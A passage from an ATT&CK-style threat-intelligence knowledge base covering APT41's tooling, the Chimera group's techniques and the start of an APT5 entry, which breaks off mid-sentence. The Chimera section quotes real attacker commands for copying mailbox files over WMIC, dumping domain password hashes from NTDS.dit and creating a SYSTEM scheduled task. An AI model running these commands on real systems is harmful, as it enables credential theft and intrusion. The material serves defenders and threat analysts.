Obfuscated Files or Information: Indicator Removal from Tools, Obfuscated Files or Information, Office Application Startup: Office Template Macros, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Security Account Manager, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Process Discovery, Process Injection: Dynamic-link Library Injection, Process Injection: Process Hollowing, Process Injection, Protocol Tunneling, Proxy: Domain Fronting, Proxy: Internal Proxy, Query Registry, Reflective Code Loading, Remote Services: Remote Desktop Protocol, Remote Services: SSH, Remote Services: Windows Remote Management, Remote Services: SMB/Windows Admin Shares, Remote Services: Distributed Component Object Model, Remote System Discovery, Scheduled Transfer, Screen Capture, Software Discovery, Subvert Trust Controls: Code Signing, System Binary Proxy Execution: Rundll32, System Network Configuration Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, Use Alternate Authentication Material: Pass the Hash, Valid Accounts: Domain Accounts, Valid Accounts: Local Accounts, Windows Management Instrumentation S1052 DEADEYE [7] Command and Scripting Interpreter: Windows Command Shell, Deobfuscate/Decode Files or Information, Execution Guardrails, Hide Artifacts: NTFS File Attributes, Masquerading: Masquerade Task or Service, Native API, Obfuscated Files or Information: Encrypted/Encoded File, Obfuscated Files or Information: Embedded Payloads, Scheduled Task/Job, System Binary Proxy Execution: Msiexec, System Binary Proxy Execution: Rundll32, System Information Discovery, System Network Configuration Discovery S0021 Derusbi [2] Audio Capture, Command and Scripting Interpreter: Unix Shell, Encrypted Channel: Symmetric Cryptography, Fallback Channels, File and Directory Discovery, Indicator Removal: Timestomp, Indicator Removal: File Deletion, Input Capture: Keylogging, Non-Application Layer Protocol, Non-Standard Port, Process Discovery, Process Injection: Dynamic-link Library Injection, Query Registry, Screen Capture, System Binary Proxy Execution: Regsvr32, System Information Discovery, System Owner/User Discovery, Video Capture S0105 dsquery [7] Account Discovery: Domain Account, Domain Trust Discovery, Permission Groups Discovery: Domain Groups, System Information Discovery S1158 DUSTPAN DUSTPAN has been used by APT41 in various campaigns since at least 2021.[12][6] Create or Modify System Process: Windows Service, Deobfuscate/Decode Files or Information, Masquerading: Match Legitimate Resource Name or Location, Obfuscated Files or Information: Encrypted/Encoded File, Obfuscated Files or Information: Embedded Payloads, Process Injection: Portable Executable Injection S1159 DUSTTRAP DUSTTRAP is used by APT41.[6] Account Discovery: Domain Account, Account Discovery: Local Account, Application Window Discovery, Command and Scripting Interpreter: Windows Command Shell, Data from Local System, Deobfuscate/Decode Files or Information, Domain Trust Discovery, Exfiltration Over C2 Channel, File and Directory Discovery, Group Policy Discovery, Indicator Removal, Indicator Removal: Clear Windows Event Logs, Indicator Removal: Network Share Connection Removal, Ingress Tool Transfer, Input Capture: Keylogging, Log Enumeration, Network Share Discovery, Obfuscated Files or Information: Encrypted/Encoded File, Obfuscated Files or Information: Embedded Payloads, Process Discovery, Process Injection, Query Registry, Remote System Discovery, Screen Capture, Software Discovery: Security Software Discovery, System Information Discovery, System Network Configuration Discovery, System Time Discovery, Virtualization/Sandbox Evasion: System Checks S0363 Empire [4] Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: SID-History Injection, Access Token Manipulation, Access Token Manipulation: Create Process with Token, Account Discovery: Domain Account, Account Discovery: Local Account, Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay, Application Layer Protocol: Web Protocols, Archive Collected Data, Automated Collection, Automated Exfiltration, Boot or Logon Autostart Execution: Security Support Provider, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: Shortcut Modification, Browser Information Discovery, Clipboard Data, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter, Create Account: Local Account, Create Account: Domain Account, Create or Modify System Process: Windows Service, Credentials from Password Stores: Credentials from Web Browsers, Domain or Tenant Policy Modification: Group Policy Modification, Domain Trust Discovery, Email Collection: Local Email Collection, Encrypted Channel: Asymmetric Cryptography, Event Triggered Execution: Accessibility Features, Exfiltration Over C2 Channel, Exfiltration Over Web Service: Exfiltration to Code Repository, Exfiltration Over Web Service: Exfiltration to Cloud Storage, Exploitation for Privilege Escalation, Exploitation of Remote Services, File and Directory Discovery, Group Policy Discovery, Hijack Execution Flow: Path Interception by Unquoted Path, Hijack Execution Flow: Path Interception by Search Order Hijacking, Hijack Execution Flow: Path Interception by PATH Environment Variable, Hijack Execution Flow: Dylib Hijacking, Hijack Execution Flow: DLL, Indicator Removal: Timestomp, Ingress Tool Transfer, Input Capture: Keylogging, Input Capture: Credential API Hooking, Native API, Network Service Discovery, Network Share Discovery, Network Sniffing, Obfuscated Files or Information: Command Obfuscation, OS Credential Dumping: LSASS Memory, Process Discovery, Process Injection, Remote Services: Distributed Component Object Model, Remote Services: SSH, Scheduled Task/Job: Scheduled Task, Screen Capture, Software Discovery: Security Software Discovery, Steal or Forge Kerberos Tickets: Kerberoasting, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, System Owner/User Discovery, System Services: Service Execution, Trusted Developer Utilities Proxy Execution: MSBuild, Unsecured Credentials: Credentials In Files, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Video Capture, Web Service: Bidirectional Communication, Windows Management Instrumentation S0095 ftp [9] Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol, Ingress Tool Transfer, Lateral Tool Transfer S0032 gh0st RAT [2] Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter, Create or Modify System Process: Windows Service, Data Encoding: Standard Encoding, Deobfuscate/Decode Files or Information, Dynamic Resolution: Fast Flux DNS, Encrypted Channel: Symmetric Cryptography, Encrypted Channel, Hijack Execution Flow: DLL, Indicator Removal: Clear Windows Event Logs, Indicator Removal: File Deletion, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Non-Application Layer Protocol, Process Discovery, Process Injection, Query Registry, Screen Capture, Shared Modules, System Binary Proxy Execution: Rundll32, System Information Discovery, System Services: Service Execution S0357 Impacket APT41 used Impacket to dump LSA secrets on one of the domain controllers in the victim network.[10] Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay, Lateral Tool Transfer, Network Sniffing, OS Credential Dumping: NTDS, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSA Secrets, Steal or Forge Kerberos Tickets: Kerberoasting, Steal or Forge Kerberos Tickets: Ccache Files, System Services: Service Execution, Windows Management Instrumentation S0100 ipconfig [3] System Network Configuration Discovery S1051 KEYPLUG [7] Application Layer Protocol: Web Protocols, Deobfuscate/Decode Files or Information, Encrypted Channel: Asymmetric Cryptography, Non-Application Layer Protocol, Obfuscated Files or Information: Encrypted/Encoded File, Proxy, System Time Discovery, Web Service: Dead Drop Resolver S1185 LightSpy [13] Application Layer Protocol: Web Protocols, Application Layer Protocol: Web Protocols, Archive Collected Data, Audio Capture, Audio Capture, Boot or Logon Initialization Scripts, Browser Information Discovery, Command and Scripting Interpreter, Credentials from Password Store: Keychain, Credentials from Password Stores: Keychain, Data Destruction, Data from Local System, Drive-By Compromise, Endpoint Denial of Service, Execution Guardrails, Exfiltration Over C2 Channel, Exfiltration Over C2 Channel, Exploitation for Client Execution, Exploitation for Privilege Escalation, File and Directory Discovery, Ingress Tool Transfer, Ingress Tool Transfer, Location Tracking, Masquerading, Native API, Network Service Discovery, Network Service Scanning, Non-Standard Port, Obfuscated Files or Information: Encrypted/Encoded File, Obfuscated Files or Information: Binary Padding, Obfuscated Files or Information, Phishing, Process Discovery, Process Discovery, Process Injection, Protected User Data: Contact List, Protected User Data: Call Log, Protected User Data: SMS Messages, Screen Capture, Screen Capture, Shared Modules, SMS Control, Software Discovery, Software Discovery, Stored Application Data, System Information Discovery, System Information Discovery, System Network Configuration Discovery: Wi-Fi Discovery, System Network Configuration Discovery, System Network Connections Discovery, Video Capture S0443 MESSAGETAP [14][4] Archive Collected Data: Archive via Custom Method, Automated Collection, Data Staged: Local Data Staging, Deobfuscate/Decode Files or Information, File and Directory Discovery, Indicator Removal: File Deletion, Network Sniffing, System Network Connections Discovery S0002 Mimikatz [2][3] Access Token Manipulation: SID-History Injection, Account Manipulation, Boot or Logon Autostart Execution: Security Support Provider, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, OS Credential Dumping: DCSync, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSASS Memory, OS Credential Dumping: LSA Secrets, Rogue Domain Controller, Steal or Forge Authentication Certificates, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Use Alternate Authentication Material: Pass the Ticket S0039 Net [2] Account Discovery: Domain Account, Account Discovery: Local Account, Account Manipulation: Additional Local or Domain Groups, Create Account: Local Account, Create Account: Domain Account, Indicator Removal: Network Share Connection Removal, Network Share Discovery, Password Policy Discovery, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Remote Services: SMB/Windows Admin Shares, Remote System Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, System Time Discovery S0104 netstat [2] System Network Connections Discovery S0385 njRAT [2] Application Layer Protocol: Web Protocols, Application Window Discovery, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Credentials from Password Stores: Credentials from Web Browsers, Data Encoding: Standard Encoding, Data from Local System, Dynamic Resolution: Fast Flux DNS, Exfiltration Over C2 Channel, File and Directory Discovery, Impair Defenses: Disable or Modify System Firewall, Indicator Removal: File Deletion, Indicator Removal: Clear Persistence, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Non-Standard Port, Obfuscated Files or Information: Encrypted/Encoded File, Obfuscated Files or Information: Compile After Delivery, Peripheral Device Discovery, Process Discovery, Query Registry, Remote Services: Remote Desktop Protocol, Remote System Discovery, Replication Through Removable Media, Screen Capture, System Information Discovery, System Owner/User Discovery, Video Capture S0097 Ping [2][3] Remote System Discovery S0013 PlugX APT41 used a variant of PlugX to connect to Windows and Linux systems via SSH and Samba/CIFS.[1][2] Application Layer Protocol: Web Protocols, Application Layer Protocol: DNS, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, File and Directory Discovery, Hide Artifacts: Hidden Files and Directories, Hijack Execution Flow: DLL, Impair Defenses: Disable or Modify System Firewall, Ingress Tool Transfer, Input Capture: Keylogging, Masquerading: Masquerade Task or Service, Masquerading: Match Legitimate Resource Name or Location, Modify Registry, Native API, Network Share Discovery, Non-Application Layer Protocol, Non-Standard Port, Obfuscated Files or Information, Process Discovery, Query Registry, Screen Capture, System Network Connections Discovery, Trusted Developer Utilities Proxy Execution: MSBuild, Virtualization/Sandbox Evasion: System Checks, Web Service: Dead Drop Resolver S0194 PowerSploit [2] Access Token Manipulation, Account Discovery: Local Account, Audio Capture, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Boot or Logon Autostart Execution: Security Support Provider, Command and Scripting Interpreter: PowerShell, Create or Modify System Process: Windows Service, Credentials from Password Stores: Windows Credential Manager, Data from Local System, Domain Trust Discovery, Hijack Execution Flow: Path Interception by PATH Environment Variable, Hijack Execution Flow: Path Interception by Unquoted Path, Hijack Execution Flow: DLL, Hijack Execution Flow: Path Interception by Search Order Hijacking, Input Capture: Keylogging, Obfuscated Files or Information: Indicator Removal from Tools, Obfuscated Files or Information: Command Obfuscation, OS Credential Dumping: LSASS Memory, Process Discovery, Process Injection: Dynamic-link Library Injection, Query Registry, Reflective Code Loading, Scheduled Task/Job: Scheduled Task, Screen Capture, Steal or Forge Kerberos Tickets: Kerberoasting, Unsecured Credentials: Credentials in Registry, Unsecured Credentials: Group Policy Preferences, Windows Management Instrumentation S0006 pwdump [2] OS Credential Dumping: Security Account Manager S0112 ROCKBOOT [2] Pre-OS Boot: Bootkit S0596 ShadowPad [2][15] Application Layer Protocol: DNS, Application Layer Protocol: File Transfer Protocols, Application Layer Protocol: Web Protocols, Data Encoding: Non-Standard Encoding, Deobfuscate/Decode Files or Information, Dynamic Resolution: Domain Generation Algorithms, Indicator Removal, Ingress Tool Transfer, Modify Registry, Non-Application Layer Protocol, Obfuscated Files or Information: Fileless Storage, Obfuscated Files or Information, Process Discovery, Process Injection, Process Injection: Dynamic-link Library Injection, Scheduled Transfer, System Information Discovery, System Network Configuration Discovery, System Owner/User Discovery, System Time Discovery S0225 sqlmap [8] Exploit Public-Facing Application S0430 Winnti for Linux [4] Application Layer Protocol: Web Protocols, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, Ingress Tool Transfer, Non-Application Layer Protocol, Obfuscated Files or Information: Encrypted/Encoded File, Rootkit, Traffic Signaling S0412 ZxShell [2] Access Token Manipulation: Create Process with Token, Application Layer Protocol: Web Protocols, Application Layer Protocol: File Transfer Protocols, Command and Scripting Interpreter: Windows Command Shell, Create Account: Local Account, Create or Modify System Process: Windows Service, Data from Local System, Endpoint Denial of Service, Exploit Public-Facing Application, File and Directory Discovery, Impair Defenses: Disable or Modify System Firewall, Impair Defenses: Disable or Modify Tools, Indicator Removal: Clear Windows Event Logs, Indicator Removal: File Deletion, Ingress Tool Transfer, Input Capture: Credential API Hooking, Input Capture: Keylogging, Modify Registry, Native API, Network Service Discovery, Non-Standard Port, Process Discovery, Process Injection: Dynamic-link Library Injection, Proxy, Query Registry, Remote Services: VNC, Remote Services: Remote Desktop Protocol, Screen Capture, System Binary Proxy Execution: Rundll32, System Information Discovery, System Owner/User Discovery, System Service Discovery, System Services: Service Execution, Video Capture References Mandiant. (n.d.). APT41, A DUAL ESPIONAGE AND CYBER CRIME OPERATION. Retrieved June 11, 2024. Fraser, N., et al. (2019, August 7). Double DragonAPT41, a dual espionage and cyber crime operation APT41. Retrieved September 23, 2019. Rostovcev, N. (2021, June 10). Big airline heist APT41 likely behind a third-party attack on Air India. Retrieved August 26, 2021. Crowdstrike. (2020, March 2). 2020 Global Threat Report. Retrieved December 11, 2020. Microsoft . (2023, July 12). How Microsoft names threat actors. Retrieved November 17, 2023. Mike Stokkel et al. (2024, July 18). APT41 Has Arisen From the DUST. Retrieved September 16, 2024. Rufus Brown, Van Ta, Douglas Bienstock, Geoff Ackerman, John Wolfram. (2022, March 8). Does This Look Infected? A Summary of APT41 Targeting U.S. State Governments. Retrieved July 8, 2022. Nikita Rostovcev. (2022, August 18). APT41 World Tour 2021 on a tight schedule. Retrieved February 22, 2024. Glyer, C, et al. (2020, March). This Is Not a Test: APT41 Initiates Global Intrusion Campaign Using Multiple Exploits. Retrieved April 28, 2020. DCSO CyTec Blog. (2022, December 24). APT41 \u2014 The spy who failed to encrypt me. Retrieved June 13, 2024. Carr, N. (2019, October 30). Nick Carr Status Update APT41 Environmental Keying. Retrieved September 12, 2024. Rufus Brown, Van Ta, Douglas Bienstock, Geoff Ackerman & John Wolfram. (2022, March 8). Does This Look Infected? A Summary of APT41 Targeting U.S. State Governments. Retrieved September 16, 2024. Melikov, D. (2024, April 11). LightSpy Returns: Renewed Espionage Campaign Targets Southern Asia, Possibly India. Retrieved January 14, 2025. Leong, R., Perez, D., Dean, T. (2019, October 31). MESSAGETAP: Who\u2019s Reading Your Text Messages?. Retrieved May 11, 2020. Insikt Group. (2021, February 28). China-Linked Group RedEcho Targets the Indian Power Sector Amid Heightened Border Tensions. Retrieved March 22, 2021. "
},
{
"id": 141,
"title": "Chimera, Group G0114",
"path": "/groups/G0114/index.html",
"content": " Chimera Chimera is a suspected China-based threat group that has been active since at least 2018 targeting the semiconductor industry in Taiwan as well as data from the airline industry.[1][2] ID: G0114 Version: 2.2 Created: 24 August 2020 Last Modified: 12 September 2024 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1087 .001 Account Discovery: Local Account Chimera has used net user for account discovery.[2] .002 Account Discovery: Domain Account Chimera has has used net user /dom and net user Administrator to enumerate domain accounts including administrator accounts.[1][2] Enterprise T1071 .001 Application Layer Protocol: Web Protocols Chimera has used HTTPS for C2 communications.[2] .004 Application Layer Protocol: DNS Chimera has used Cobalt Strike to encapsulate C2 in DNS traffic.[2] Enterprise T1560 .001 Archive Collected Data: Archive via Utility Chimera has used gzip for Linux OS and a modified RAR software to archive data on Windows hosts.[1][2] Enterprise T1119 Automated Collection Chimera has used custom DLLs for continuous retrieval of data from memory.[2] Enterprise T1217 Browser Information Discovery Chimera has used type \\\\c$\\Users\\\\Favorites\\Links\\Bookmarks bar\\Imported From IE*citrix* for bookmark discovery.[2] Enterprise T1110 .003 Brute Force: Password Spraying Chimera has used multiple password spraying attacks against victim's remote services to obtain valid user and administrator accounts.[2] .004 Brute Force: Credential Stuffing Chimera has used credential stuffing against victim's remote services to obtain valid accounts.[2] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell Chimera has used PowerShell scripts to execute malicious payloads and the DSInternals PowerShell module to make use of Active Directory features.[1][2] .003 Command and Scripting Interpreter: Windows Command Shell Chimera has used the Windows Command Shell and batch scripts for execution on compromised hosts.[2] Enterprise T1213 .002 Data from Information Repositories: Sharepoint Chimera has collected documents from the victim's SharePoint.[2] Enterprise T1039 Data from Network Shared Drive Chimera has collected data of interest from network shares.[2] Enterprise T1074 .001 Data Staged: Local Data Staging Chimera has staged stolen data locally on compromised hosts.[2] .002 Data Staged: Remote Data Staging Chimera has staged stolen data on designated servers in the target environment.[2] Enterprise T1482 Domain Trust Discovery Chimera has nltest /domain_trusts to identify domain trust relationships.[2] Enterprise T1114 .001 Email Collection: Local Email Collection Chimera has harvested data from victim's e-mail including through execution of wmic /node: process call create \"cmd /c copy c:\\Users\\\\\\backup.pst c:\\windows\\temp\\backup.pst\" copy \"i:\\\\\\My Documents\\.pst\"copy.[2] .002 Email Collection: Remote Email Collection Chimera has harvested data from remote mailboxes including through execution of \\\\c$\\Users\\\\AppData\\Local\\Microsoft\\Outlook*.ost.[2] Enterprise T1041 Exfiltration Over C2 Channel Chimera has used Cobalt Strike C2 beacons for data exfiltration.[2] Enterprise T1567 .002 Exfiltration Over Web Service: Exfiltration to Cloud Storage Chimera has exfiltrated stolen data to OneDrive accounts.[2] Enterprise T1133 External Remote Services Chimera has used legitimate credentials to login to an external VPN, Citrix, SSH, and other remote services.[1][2] Enterprise T1083 File and Directory Discovery Chimera has utilized multiple commands to identify data of interest in file and directory listings.[2] Enterprise T1589 .001 Gather Victim Identity Information: Credentials Chimera has collected credentials for the target organization from previous breaches for use in brute force attacks.[2] Enterprise T1574 .001 Hijack Execution Flow: DLL Chimera has used side loading to place malicious DLLs in memory.[2] Enterprise T1070 .001 Indicator Removal: Clear Windows Event Logs Chimera has cleared event logs on compromised hosts.[2] .004 Indicator Removal: File Deletion Chimera has performed file deletion to evade detection.[1] .006 Indicator Removal: Timestomp Chimera has used a Windows version of the Linux touch command to modify the date and time stamp on DLLs.[2] Enterprise T1105 Ingress Tool Transfer Chimera has remotely copied tools and malware onto targeted systems.[1] Enterprise T1570 Lateral Tool Transfer Chimera has copied tools between compromised hosts using SMB.[2] Enterprise T1036 .005 Masquerading: Match Legitimate Resource Name or Location Chimera has renamed malware to GoogleUpdate.exe and WinRAR to jucheck.exe, RecordedTV.ms, teredo.tmp, update.exe, and msadcs1.exe.[1] Enterprise T1556 .001 Modify Authentication Process: Domain Controller Authentication Chimera's malware has altered the NTLM authentication program on domain controllers to allow Chimera to login without a valid credential.[1] Enterprise T1111 Multi-Factor Authentication Interception Chimera has registered alternate phone numbers for compromised users to intercept 2FA codes sent via SMS.[2] Enterprise T1106 Native API Chimera has used direct Windows system calls by leveraging Dumpert.[1] Enterprise T1046 Network Service Discovery Chimera has used the get -b -e -p command for network scanning as well as a custom Python tool packed into a Windows executable named Get.exe to scan IP ranges for HTTP.[2] Enterprise T1135 Network Share Discovery Chimera has used net share and net view to identify network shares of interest.[2] Enterprise T1027 .010 Obfuscated Files or Information: Command Obfuscation Chimera has encoded PowerShell commands.[1] Enterprise T1588 .002 Obtain Capabilities: Tool Chimera has obtained and used tools such as BloodHound, Cobalt Strike, Mimikatz, and PsExec.[1][2] Enterprise T1003 .003 OS Credential Dumping: NTDS Chimera has gathered the SYSTEM registry and ntds.dit files from target systems.[1] Chimera specifically has used the NtdsAudit tool to dump the password hashes of domain users via msadcs.exe \"NTDS.dit\" -s \"SYSTEM\" -p RecordedTV_pdmp.txt --users-csv RecordedTV_users.csv and used ntdsutil to copy the Active Directory database.[2] Enterprise T1201 Password Policy Discovery Chimera has used the NtdsAudit utility to collect information related to accounts and passwords.[2] Enterprise T1069 .001 Permission Groups Discovery: Local Groups Chimera has used net localgroup administrators to identify accounts with local administrative rights.[2] Enterprise T1057 Process Discovery Chimera has used tasklist to enumerate processes.[2] Enterprise T1572 Protocol Tunneling Chimera has encapsulated Cobalt Strike's C2 protocol in DNS and HTTPS.[2] Enterprise T1012 Query Registry Chimera has queried Registry keys using reg query \\\\HKU\\\\SOFTWARE\\Microsoft\\Terminal Server Client\\Servers and reg query \\\\HKU\\\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings.[2] Enterprise T1021 .001 Remote Services: Remote Desktop Protocol Chimera has used RDP to access targeted systems.[1] .002 Remote Services: SMB/Windows Admin Shares Chimera has used Windows admin shares to move laterally.[1][2] .006 Remote Services: Windows Remote Management Chimera has used WinRM for lateral movement.[2] Enterprise T1018 Remote System Discovery Chimera has utilized various scans and queries to find domain controllers and remote services in the target environment.[2] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task Chimera has used scheduled tasks to invoke Cobalt Strike including through batch script schtasks /create /ru \"SYSTEM\" /tn \"update\" /tr \"cmd /c c:\\windows\\temp\\update.bat\" /sc once /f /st and to maintain persistence.[1][2] Enterprise T1082 System Information Discovery Chimera has used fsutil fsinfo drives, systeminfo, and vssadmin list shadows for system information including shadow volumes and drive information.[2] Enterprise T1016 System Network Configuration Discovery Chimera has used ipconfig, Ping, and tracert to enumerate the IP address and network environment and settings of the local host.[2] Enterprise T1049 System Network Connections Discovery Chimera has used netstat -ano | findstr EST to discover network connections.[2] Enterprise T1033 System Owner/User Discovery Chimera has used the quser command to show currently logged on users.[2] Enterprise T1007 System Service Discovery Chimera has used net start and net use for system service discovery.[2] Enterprise T1569 .002 System Services: Service Execution Chimera has used PsExec to deploy beacons on compromised systems.[2] Enterprise T1124 System Time Discovery Chimera has used time /t and net time \\ip/hostname for system time discovery.[2] Enterprise T1550 .002 Use Alternate Authentication Material: Pass the Hash Chimera has dumped password hashes for use in pass the hash authentication attacks.[2] Enterprise T1078 Valid Accounts Chimera has used a valid account to maintain persistence via scheduled task.[1] .002 Domain Accounts Chimera has used compromised domain accounts to gain access to the target environment.[2] Enterprise T1047 Windows Management Instrumentation Chimera has used WMIC to execute remote commands.[1][2] Software ID Name References Techniques S0521 BloodHound [1] Account Discovery: Domain Account, Account Discovery: Local Account, Archive Collected Data, Command and Scripting Interpreter: PowerShell, Domain Trust Discovery, Group Policy Discovery, Native API, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Remote System Discovery, System Owner/User Discovery S0154 Cobalt Strike [1][2] Abuse Elevation Control Mechanism: Sudo and Sudo Caching, Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: Parent PID Spoofing, Access Token Manipulation: Token Impersonation/Theft, Access Token Manipulation: Make and Impersonate Token, Account Discovery: Domain Account, Application Layer Protocol: DNS, Application Layer Protocol: Web Protocols, Application Layer Protocol: File Transfer Protocols, BITS Jobs, Browser Session Hijacking, Command and Scripting Interpreter: JavaScript, Command and Scripting Interpreter: Visual Basic, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Python, Command and Scripting Interpreter: Windows Command Shell, Create or Modify System Process: Windows Service, Data Encoding: Standard Encoding, Data from Local System, Data Obfuscation: Protocol or Service Impersonation, Data Transfer Size Limits, Deobfuscate/Decode Files or Information, Encrypted Channel: Asymmetric Cryptography, Encrypted Channel: Symmetric Cryptography, Exploitation for Client Execution, Exploitation for Privilege Escalation, File and Directory Discovery, Hide Artifacts: Process Argument Spoofing, Impair Defenses: Disable or Modify Tools, Indicator Removal: Timestomp, Ingress Tool Transfer, Input Capture: Keylogging, Modify Registry, Native API, Network Service Discovery, Network Share Discovery, Non-Application Layer Protocol, Obfuscated Files or Information: Indicator Removal from Tools, Obfuscated Files or Information, Office Application Startup: Office Template Macros, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Security Account Manager, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Process Discovery, Process Injection: Dynamic-link Library Injection, Process Injection: Process Hollowing, Process Injection, Protocol Tunneling, Proxy: Domain Fronting, Proxy: Internal Proxy, Query Registry, Reflective Code Loading, Remote Services: Remote Desktop Protocol, Remote Services: SSH, Remote Services: Windows Remote Management, Remote Services: SMB/Windows Admin Shares, Remote Services: Distributed Component Object Model, Remote System Discovery, Scheduled Transfer, Screen Capture, Software Discovery, Subvert Trust Controls: Code Signing, System Binary Proxy Execution: Rundll32, System Network Configuration Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, Use Alternate Authentication Material: Pass the Hash, Valid Accounts: Domain Accounts, Valid Accounts: Local Accounts, Windows Management Instrumentation S0404 esentutl [2] Data from Local System, Direct Volume Access, Hide Artifacts: NTFS File Attributes, Ingress Tool Transfer, Lateral Tool Transfer, OS Credential Dumping: NTDS S0002 Mimikatz [1][2] Access Token Manipulation: SID-History Injection, Account Manipulation, Boot or Logon Autostart Execution: Security Support Provider, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, OS Credential Dumping: DCSync, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSASS Memory, OS Credential Dumping: LSA Secrets, Rogue Domain Controller, Steal or Forge Authentication Certificates, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Use Alternate Authentication Material: Pass the Ticket S0039 Net [2] Account Discovery: Domain Account, Account Discovery: Local Account, Account Manipulation: Additional Local or Domain Groups, Create Account: Local Account, Create Account: Domain Account, Indicator Removal: Network Share Connection Removal, Network Share Discovery, Password Policy Discovery, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Remote Services: SMB/Windows Admin Shares, Remote System Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, System Time Discovery S0029 PsExec [2] Create Account: Domain Account, Create or Modify System Process: Windows Service, Lateral Tool Transfer, Remote Services: SMB/Windows Admin Shares, System Services: Service Execution References Cycraft. (2020, April 15). APT Group Chimera - APT Operation Skeleton key Targets Taiwan Semiconductor Vendors. Retrieved August 24, 2020.. Jansen, W . (2021, January 12). Abusing cloud services to fly under the radar. Retrieved September 12, 2024. "
},
{
"id": 142,
"title": "APT5, Mulberry Typhoon, MANGANESE, BRONZE FLEETWOOD, Keyhole Panda, UNC2630, Group G1023",
"path": "/groups/G1023/index.html",
"content": " APT5 APT5 is a China-based espionage actor that has been active since at least 2007 primarily targeting the telecommunications, aerospace, and defense industries throughout the U.S., Europe, and Asia. APT5 has displayed advanced tradecraft and significant interest in compromising networking devices and their underlying software including through the use of zero-day exploits.[1][2][3][4][5][6] ID: G1023 \u24d8 Associated Groups: Mulberry Typhoon, MANGANESE, BRONZE FLEETWOOD, Keyhole Panda, UNC2630 Contributors: @_montysecurity Version: 1.1 Created: 05 February 2024 Last Modified: 04 April 2025 Version Permalink Live Version Associated Group Descriptions Name Description Mulberry Typhoon [7][2] MANGANESE [7][1] BRONZE FLEETWOOD [8] Keyhole Panda [7][8] UNC2630 [1] Campaigns ID Name First Seen Last Seen References Techniques C0052 SPACEHOP Activity January 2019 [9] May 2024 [9] [9] Acquire Infrastructure: Virtual Private Server, Exploit Public-Facing Application, Obtain Capabilities: Tool, Proxy: Multi-hop Proxy Techniques Used Domain ID Name Use Enterprise T1098 .007 Account Manipulation: Additional Local or Domain Groups APT5 has created their own accounts with Local Administrator privileges to maintain access to systems with short-cycle credential rotation.[4] Enterprise T1583 .003 Acquire Infrastructure: Virtual Private Server SPACEHOP Activity has used acquired Virtual Private Servers as control systems for devices within the ORB network.[9] .005 Acquire Infrastructure: Botnet APT5 has acquired a network of compromised systems \u2013 specifically an ORB (operational relay box) network \u2013 for follow on activities.[9] Enterprise T1560 .001 Archive Collected Data: Archive via Utility APT5 has used the JAR/ZIP file format for exfiltrated files.[4] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell APT5 has used PowerShell to accomplish tasks within targeted environments.[4] .003 Command and Scripting Interpreter: Windows Command Shell APT5 has used cmd.exe for execution on compromised systems.[4] Enterprise T1554 Compromise Host Software Binary APT5 has modified legitimate binaries and scripts for Pulse Secure VPNs including the legitimate DSUpgrade.pm file to install the ATRIUM webshell for persistence.[3][4] Enterprise T1136 .001 Create Account: Local Account APT5 has created Local Administrator accounts to maintain access to systems with short-cycle credential rotation.[4] Enterprise T1074 .001 Data Staged: Local Data Staging APT5 has staged data on compromised systems prior to exfiltration often in C:\\Users\\Public.[4] Enterprise T1190 Exploit Public-Facing Application APT5 has exploited vulnerabilities in externally facing software and devices including Pulse Secure VPNs and Citrix Application Delivery Controllers.[3][4][1] [2] SPACEHOP Activity has enabled the exploitation of CVE-2022-27518 and CVE-2022-27518 for illegitimate access.[1][9] Enterprise T1083 File and Directory Discovery APT5 has used the 